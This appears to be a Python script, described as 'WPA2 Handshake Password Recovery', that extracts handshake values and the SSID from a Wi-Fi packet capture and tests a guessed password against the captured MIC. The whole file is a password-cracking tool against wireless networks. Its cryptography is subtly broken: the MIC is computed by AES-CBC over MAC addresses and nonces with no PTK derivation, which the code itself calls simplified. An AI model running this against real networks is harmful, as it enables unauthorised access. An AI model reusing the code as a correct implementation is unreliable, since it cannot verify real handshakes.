import argparse
from scapy.all import *
import hashlib
from pbkdf2 import PBKDF2
from Crypto.Cipher import AES
import struct

def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            # Check if it's a Key (Message 2 of 4)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                print(f"Extracted MIC: {mic.hex()}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    print(f"Extracted SNonce: {snonce.hex()}")

            # Check if it's a Key (Message 3 of 4) to extract ANonce
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                print(f"Extracted ANonce: {anonce.hex()}")

            # Extract STA MAC and BSSID
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                bssid = packet.addr1
                print(f"Extracted STA MAC: {sta_mac}")
                print(f"Extracted BSSID: {bssid}")

            # Break the loop if all values are found
            if mic and snonce and sta_mac and bssid and anonce:
                break

        # Extract SSID from Beacon packets
        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            print(f"Extracted SSID: {ssid}")

    if not snonce:
        print("No SNonce found in Message 2 of 4.")
    if not mic:
        print("No MIC found.")
    if not sta_mac:
        print("No STA MAC found.")
    if not bssid:
        print("No BSSID found.")
    if not anonce:
        print("No ANonce found in Message 3 of 4.")
    if not ssid:
        print("No SSID found.")

    return mic, snonce, anonce, sta_mac, bssid, ssid

def derive_pmk(password, ssid):
    """ Derive PMK from password and SSID using PBKDF2 """
    ssid = ssid.encode('utf-8')
    password = password.encode('utf-8')
    # PBKDF2 key derivation function
    pmk = PBKDF2(password, ssid, 4096, dklen=32).read()
    return pmk

def generate_mic(pmk, anonce, snonce, sta_mac, bssid):
    """ Generate MIC using PMK, Nonces, and MAC addresses """
    # Prepare the keys for AES and MIC calculation
    key = pmk[:16]  # WPA2 uses the first 16 bytes of the PMK as the key
    cipher = AES.new(key, AES.MODE_CBC, b'\x00' * 16)  # Initialization Vector (IV) is all zeros
    
    # EAPOL message 2 of 4 (simplified for illustrative purposes)
    mic_data = struct.pack("!6s6s", sta_mac, bssid) + anonce + snonce
    mic = cipher.encrypt(mic_data)
    return mic

def compare_password_with_capture(password, capture_file):
    mic, snonce, anonce, sta_mac, bssid, ssid = extract_mic_and_nonce_and_ssid(capture_file)

    if mic and snonce and anonce and sta_mac and bssid and ssid:
        # Derive PMK from password and SSID
        pmk = derive_pmk(password, ssid)
        
        # Generate MIC from PMK and Nonces
        calculated_mic = generate_mic(pmk, anonce, snonce, sta_mac, bssid)
        
        # Compare the calculated MIC with the captured MIC
        if mic == calculated_mic:
            print("Password matched!")
        else:
            print("Password did not match.")
    else:
        print("Missing data in the capture to perform MIC comparison.")

def main():
    parser = argparse.ArgumentParser(description="WPA2 Handshake Password Recovery")
    parser.add_argument('password', type=str, help='Password to compare against capture')
    parser.add_argument('capture', type=str, help='Capture file containing the handshake')

    args = parser.parse_args()
    
    compare_password_with_capture(args.password, args.capture)

if __name__ == '__main__':
    main()
